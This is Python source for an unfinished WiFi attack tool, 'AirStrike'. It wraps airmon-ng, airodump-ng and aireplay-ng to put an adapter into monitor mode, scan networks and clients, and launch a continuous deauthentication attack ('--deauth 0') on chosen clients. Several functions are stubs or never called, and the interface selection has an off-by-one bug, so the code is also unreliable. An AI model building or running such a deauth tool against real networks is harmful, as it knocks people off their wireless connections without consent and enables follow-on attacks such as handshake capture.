import os
from datetime import datetime
import shutil
import subprocess
import re

# Colors
cyan = "\033[1;36m"
red = "\033[1;31m"
green = "\033[38;5;82m"
yellow = "\033[1;33m"
white = "\033[39m"
blue = "\033[1;34m"
purple = "\033[1;35m"
teal = "\033[38;5;37m"
reset = "\033[0m"


logo = teal + r"""
########################################
  ___  _      _____ _        _ _        
 / _ \(_)    /  ___| |      (_) |       
/ /_\ \_ _ __\ `--.| |_ _ __ _| | _____ 
|  _  | | '__|`--. \ __| '__| | |/ / _ \
| | | | | |  /\__/ / |_| |  | |   <  __/
\_| |_/_|_|  \____/ \__|_|  |_|_|\_\___|
                                        
########################################                          
""" + reset + "\n\n"


def check_sudo():
    """Verify sudo privileges."""
    if not "SUDO_UID" in os.environ.keys():
        print(f"{red}[!] Please run the tool with sudo privileges.{reset}")
        exit()

def backup_csv():
    """Backup old CSV files from previous runs."""
    for file_name in os.listdir():
        if ".csv" in file_name:
            print(f"{yellow}[!]{reset} Moving old .csv files in the backup folder.")
            cwd = os.getcwd()
            if not os.path.exists("backup"):
                os.mkdir("backup")
            timestam = datetime.now()
            shutil.move(file_name, f"{cwd}/backup/{str(timestam)}_{file_name}")

def get_wifi_int():
    """List available WiFi interfaces"""
    wlan_pattern = re.compile(r"\bwlan[0-9]+\b")
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    net_int = wlan_pattern.findall(result)
    if len(net_int) == 0 or not net_int:
        print(f"{red}[!] No WiFi interfaces found.{reset} ")
        exit()
    else:
        print(f"{green}[+]{reset} The following WiFi interfaces are available:")
        for index, item in enumerate(net_int):
            print(f"{purple}[{index}]{reset} {cyan}{item}{reset}")
        while True:
            try:
                choice = int(input(f"\n{yellow}[>]{reset} Please select the interface you want to use for the attack: ").strip())
                if 0 <= choice <= len(net_int) - 1:
                    print(f"{green}[+] {net_int[choice]} connected.{reset}")
                    break
                else:
                    print(f"{red}[!]{reset} Please enter a number that corresponds with the choises available.")
            except ValueError as e:
                print(f"{red}[!] VallueError: {e}{reset}")
        return net_int[choice - 1]
        
def set_monitor_mode(inf):
    """Switch interface in monitor mode."""
    try:
        print(f"{yellow}[*]{reset} Switching to 'monitor' mode...")
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        subprocess.run(["ip", "link", "set", inf, "down"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["iwconfig", inf, "mode", "monitor"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["ip", "link", "set", inf, "up"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        mode = subprocess.run(["iw", "dev", inf, "info"], capture_output=True).stdout.decode()
        if "monitor" not in mode.lower():
            raise Exception(f"Failed to switch. Make sure your adaptor supports 'monitor' mode")
        else:
            print(f"{green}[+] {inf} switched to 'monitor' mode successfully.{reset}\n")
    except Exception as e:
        print(f"{red}[!] Error switching to 'monitor' mode: {e}{reset}")

def set_band_to_monitor(band, inf):
    """Select 2.4GHz, 5GHz, or both) for monitoring."""
    try:
        if band and inf:
            subprocess.Popen(["airodump-ng", "--band", band, "-w", "file", "--write-interval", "1", "--output-format", "csv", inf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"{red}[!] Scan failed: {e}{reset}")

#### not finished yet
def scan_networks(inf):
    """Run airodump-ng to discover networks."""
    try:
        wifi_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (all bands, will be slower)"]
        print(f"\n{yellow}[?]{reset} Please select the frequency you want to scan {cyan}(verify that your adapter supports 5GHz if chosen){reset}:")
        for idx, band in enumerate(wifi_bands):
            print(f"{purple}[{idx}]{reset} {cyan}{band}{reset}")
        while True:
            try:
                choice = int(input(f"\n{yellow}[>]{reset} Your choice (0-2): ").strip())
                if 0 <= choice <= len(wifi_bands) - 1:
                    freq = wifi_bands[choice].split(" ")[0].strip()
                    break
                else:
                    raise ValueError("Please make a valid selection.")
            except ValueError as e:
                print(f"{red}[!] {e}{reset}")
        print(freq)
        print(f"{green}[+] Scanning {wifi_bands[choice]}....{reset}\n")
    except (Exception) as e:
        print(f"{red}[!] Scan networks failed: {e}{reset}")

def select_target(networks):
    """Display network menu and return user's choice."""
    pass

def get_clients(wifi_ssid, wifi_channel, wifi_name):
    """Capture clients on target network."""
    subprocess.Popen(["airodump-ng", "--bssid", wifi_ssid, "--channel", wifi_channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def filter_clients():
    """Exclude whitelisted MACs from attack."""
    mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
    excluded_macs = []
    while True:
        try:
            print(f"\n{yellow}[-]{reset} Enter MACs to exclude (comma-separated) or leave empty to attack all.")
            macs = input(f"{yellow}[>]{reset} Your choices {cyan}ie 00:11:22:33:44:55,11:22:33:44:55:66{reset} :\n")
            if not macs:
                print(f"{green}[!]{reset} You will attack all the clients.")
                return []
            macs_list = list(macs.split(","))
            for mac in macs_list:
                if not mac_address_regex.match(mac.strip()):
                    raise ValueError("One or more MAC adresses have invalid format.")
            excluded_macs = mac_address_regex.findall(macs)
            if len(excluded_macs) > 0:
                excluded_macs = [mac.upper() for mac in excluded_macs]
                print(f"{yellow}[*]{reset} Excluded macs:")
                for m in excluded_macs:
                    print(f"    {purple}{m}{reset}")
                return excluded_macs
        except (Exception, ValueError) as e:
            print(f"{red}[!] Error filtering clients: {e}{reset}")

def deauth_attack(network_mac, target_mac, interface):
    """Deauth attack on selected clients."""
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])

def restore_managed_mode(inf):
    """Revert interface to default managed mode."""
    try:
        print(f"{yellow}[*]{reset} Switching to default 'managed' mode...")
        subprocess.run(["ip", "link", "set", inf, "down"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["iwconfig", inf, "mode", "managed"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["ip", "link", "set", inf, "up"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["service", "NetworkManager", "start"], check=True)
        mode = subprocess.run(["iw", "dev", inf, "info"], capture_output=True).stdout.decode()
        if "managed" not in mode.lower():
            raise Exception(f"Failed to switch to 'managed' mode")
        else:
            print(f"{green}[+] {inf} switched to 'managed' mode successfully.{reset}\n")
    except Exception as e:
        print(f"{red}[!] Error switching to 'managed' mode: {e}{reset}")

def main():
    os.system("clear")
    print(logo)
    check_sudo()
    inter = get_wifi_int()
    filter_clients()
    scan_networks(inter)

if __name__ == "__main__":
    main()